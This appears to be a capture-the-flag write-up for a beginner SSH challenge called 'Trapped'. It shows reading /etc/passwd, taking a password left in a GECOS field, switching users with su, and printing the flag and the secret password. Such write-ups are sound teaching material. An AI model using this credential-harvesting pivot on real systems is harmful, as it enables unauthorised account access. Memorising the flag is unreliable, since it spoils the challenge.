# Challenge Name: Trapped

## Description

**Category:** Misc (Beginner)
**Points:** 50
**Author:** x03e

> Strict restrictions to earn the flag.
>
> usr: trapped | pswd: password
>
> Suffering ends in 27 minutes.

**Connection:**

```bash
ssh -o StrictHostKeyChecking=no trapped@chall.0xfun.org -p24527
```

**Flag format:** `0xfun{...}`

---

## Writeup

### Step 1: Initial Access

Connect using the provided credentials:

```bash
ssh -tt trapped@chall.0xfun.org -p24527
# Password: password
```

The `-tt` forces a proper TTY allocation, giving us a usable shell:

```
trapped@container:~$
```

### Step 2: Enumeration

Listing the home directory:

```bash
ls -la
```

```
----r-----+ 1 root root 27 flag.txt
```

Key observations:

- `flag.txt` is owned by `root`
- No read permission for `trapped`
- The `+` at the end indicates **extended ACLs** are set

Attempting `cat flag.txt` results in `Permission denied`.

### Step 3: Check /etc/passwd

```bash
cat /etc/passwd
```

We notice an interesting entry:

```
secretuser:x:1001:1001:Unc0ntr0lled1234Passw0rd:/home/secretuser:/bin/sh
```

The **GECOS field** (comment field) contains `Unc0ntr0lled1234Passw0rd` — clearly placed intentionally.

### Step 4: User Pivot

Switch to `secretuser`:

```bash
su secretuser
# Password: Unc0ntr0lled1234Passw0rd
```

Verify:

```bash
id
# uid=1001(secretuser)
```

### Step 5: Why This Works

The `+` in `ls -l` indicated an ACL. Looking at `/start.sh`:

```bash
setfacl -m u:$SECRET_USER:r /home/$USER1/flag.txt
```

So `secretuser` has explicit ACL-based read permission on `/home/trapped/flag.txt`.

### Step 6: Read the Flag

```bash
cat /home/trapped/flag.txt
```

---

## Resources

No local files — challenge is fully remote (SSH).

---

## Flag

```
0xfun{4ccess_unc0ntroll3d}
```

---

## Lessons Learned

- Always enumerate `/etc/passwd` — the GECOS field may contain credentials.
- `+` in `ls -l` output means **ACLs** are set.
- Not all access issues require privilege escalation — credential leakage is often simpler.
